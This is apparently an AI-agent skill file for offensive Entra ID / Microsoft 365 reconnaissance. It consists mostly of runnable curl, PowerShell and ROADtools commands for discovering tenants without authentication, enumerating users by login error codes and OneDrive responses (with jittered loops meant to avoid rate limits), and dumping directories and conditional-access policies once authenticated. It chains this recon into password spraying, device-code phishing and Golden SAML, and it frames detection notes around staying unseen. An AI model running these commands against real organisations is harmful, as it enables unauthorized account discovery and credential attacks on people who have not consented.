---
name: entra-enum
description: "Entra ID / M365 reconnaissance — unauthenticated tenant discovery via OpenID config, GetUserRealm, autodiscover; user enumeration via login response codes and OneDrive; federation/MFA/CA posture; authenticated enumeration with ROADtools (roadrecon), AADInternals, MSGraph."
allowed-tools: Bash Read Write
metadata:
  when_to_use: "entra azure ad aad m365 office365 tenant discovery user enumeration onedrive getuserrealm openid federation roadrecon roadtools aadinternals graph conditional access mfa posture recon"
  subdomain: cloud
  tags: azure, entra-id, m365, recon, enumeration
  mitre_attack: T1087.004, T1589.002, T1526, T1078.004
---

# Entra ID / M365 Enumeration

You have a target domain (e.g. `<TARGET>`) and want to map the Entra ID tenant before any auth attempt. Tenant ID, validated users, federation type, MFA/CA posture — all reachable unauth. Then layer authenticated recon once you have a token.

## Phase 0: Tenant discovery (unauth)

```bash
TARGET=<TARGET>           # e.g. contoso.com
# 1. OpenID config — tenant ID + auth endpoints
curl -s "https://login.microsoftonline.com/${TARGET}/.well-known/openid-configuration" | jq '{tenant: .issuer, authz: .authorization_endpoint, token: .token_endpoint}'

# 2. GetUserRealm — federation type (Managed | Federated | Unknown)
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=any@${TARGET}&xml=1"

# 3. Autodiscover — federated IdP hint (ADFS, Okta, PingFed)
curl -s "https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc" \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: \"http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation\"" \
  -d @- <<XML | xmllint --format -
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:a="http://schemas.microsoft.com/exchange/2010/Autodiscover">
  <soap:Header><a:RequestedServerVersion>Exchange2010</a:RequestedServerVersion></soap:Header>
  <soap:Body><a:GetFederationInformationRequestMessage><a:Request><a:Domain>${TARGET}</a:Domain></a:Request></a:GetFederationInformationRequestMessage></soap:Body>
</soap:Envelope>
XML

# 4. Tenant branding (logo, banner string => social-engineering pretext)
curl -sI "https://login.microsoftonline.com/${TARGET}/v2.0/.well-known/openid-configuration"
```

Pull tenant ID into env:
```bash
TENANT=$(curl -s "https://login.microsoftonline.com/${TARGET}/.well-known/openid-configuration" | jq -r .issuer | awk -F/ '{print $4}')
echo "$TENANT"   # GUID
```

## Phase 1: User enumeration (unauth)

### o365creeper — login endpoint response codes
```bash
# AADSTS50053 = locked, AADSTS50034 = user doesn't exist, AADSTS50126 = wrong pw (= valid user)
curl -s -X POST "https://login.microsoftonline.com/common/oauth2/token" \
  -d "resource=https://graph.windows.net&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&grant_type=password&username=<UPN>&password=Invalid!" \
  -d "scope=openid" | jq -r .error_description
```

Drive it from a list:
```bash
for u in $(cat users.txt); do
  err=$(curl -s -X POST "https://login.microsoftonline.com/common/oauth2/token" \
    -d "resource=https://graph.windows.net&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&grant_type=password&username=${u}@${TARGET}&password=NotReal_$(date +%s)!" \
    | jq -r .error_description | awk '{print $1}')
  case "$err" in AADSTS50126|AADSTS50053|AADSTS50079|AADSTS50076) echo "VALID: $u" ;; esac
  sleep $((RANDOM % 3 + 2))
done
```

### OneDrive enumeration (no auth, no rate-limit log)
```bash
# Domain prefix derived from primary domain — `contoso.com` -> `contoso`
TENANT_PREFIX=<PREFIX>
curl -s -o /dev/null -w "%{http_code} ${u}\n" \
  "https://${TENANT_PREFIX}-my.sharepoint.com/personal/${u}_${TARGET//./_}/_layouts/15/onedrive.aspx"
# 403 => user exists, 404 => doesn't. Zero auth events generated.
```

### Teams presence (authenticated, but very low-noise)
```bash
# With any tenant token:
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://presence.teams.microsoft.com/v1/presence/getpresence/" \
  -d '{"mris":["8:orgid:<USER_GUID>"]}'
```

## Phase 2: Federation + MFA posture

```bash
# Managed vs Federated
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=test@${TARGET}&xml=1" | grep -oE '<NameSpaceType>[^<]+'

# If Federated => target the IdP (ADFS endpoints exposed):
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=test@${TARGET}&xml=1" | grep -oE '<STSAuthURL>[^<]+'

# Seamless SSO probe (DesktopSso) — presence of /DesktopSsoAuth indicates SSO
curl -sI "https://autologon.microsoftazuread-sso.com/${TARGET}/winauth/trust/2005/usernamemixed?client-request-id=<GUID>"
```

## Phase 3: Authenticated enumeration

### roadrecon (ROADtools)
```bash
pipx install roadtools
roadrecon auth -u <UPN> -p '<PASSWORD>'                  # device-code: roadrecon auth --device-code
roadrecon gather                                          # pulls users/groups/apps/roles/devices/CAs
roadrecon dump --format json --file roadrecon.json
roadrecon gui                                             # graph-aware browser
```

Targeted Cypher-like queries via `roadrecon plugin`:
```bash
roadrecon plugin policies   # ALL conditional access policies (raw JSON)
roadrecon plugin privexch   # high-priv mailbox roles
```

### AADInternals (PowerShell — fewer Graph audit events)
```powershell
Install-Module AADInternals -Force
$at = Get-AADIntAccessTokenForAADGraph -SaveToCache
Get-AADIntTenantDomains -Domain <TARGET>
Get-AADIntLoginInformation -Domain <TARGET>
Get-AADIntUsers | Select UserPrincipalName,DisplayName,immutableId
Invoke-AADIntReconAsOutsider -DomainName <TARGET>     # 100% unauth
Invoke-AADIntUserEnumerationAsOutsider -UserName users.txt
```

### MSGraph direct
```bash
curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/users?\$select=userPrincipalName,id,onPremisesSyncEnabled" | jq .
curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/directoryRoles" | jq '.value[]|.displayName'
curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/beta/policies/conditionalAccessPolicies" | jq '.value[]|{n:.displayName,s:.state}'
```

## Chains
- **Tenant discovery → user spray → password-spray** (rate-limited; pair with `entra-conditional-access-bypass` for legacy-auth endpoints).
- **Federation discovery → ADFS target** (Golden SAML — see `entra-privesc`).
- **OneDrive enum (silent) → device-code phish** (see `entra-device-code-phishing`).
- **`onPremisesSyncEnabled=true` → hybrid identity hunt** → AAD Connect server.

## Tools
- **ROADtools / roadrecon** — primary authenticated enum (Dirk-jan Mollema).
- **AADInternals** — PowerShell, deep AAD internals, both unauth + auth modes.
- **o365creeper / MailSniper / MSOLSpray** — user enumeration + spray.
- **TeamFiltration** — combined enum/spray/exfil from M365.
- **GraphRunner** — auth Graph operator UI.

## Detection signatures
- Sign-in logs: high volume of `50034` (unknown user) followed by `50126` => spray reconnaissance.
- Repeated `getuserrealm.srf` from one IP is invisible to tenants — not logged.
- OneDrive `403` ping pattern is also unlogged at the tenant — assume zero detection.
- `roadrecon gather` produces ~30s burst of Graph queries from one IP — show up in audit log as `Microsoft.Graph` reads from non-corp ASN.

## Decision gate
- Federation == Federated → pivot to ADFS / IdP attacks; Golden SAML viable if you own the IdP host.
- Federation == Managed and CA blocks legacy → escalate to device-code phishing.
- `onPremisesSyncEnabled=true` on most users → hybrid env → hunt AAD Connect / `azure-managed-identity` MSOL extraction.
- No CA on legacy auth → spray IMAP/POP/SMTP-AUTH (see `entra-conditional-access-bypass`).
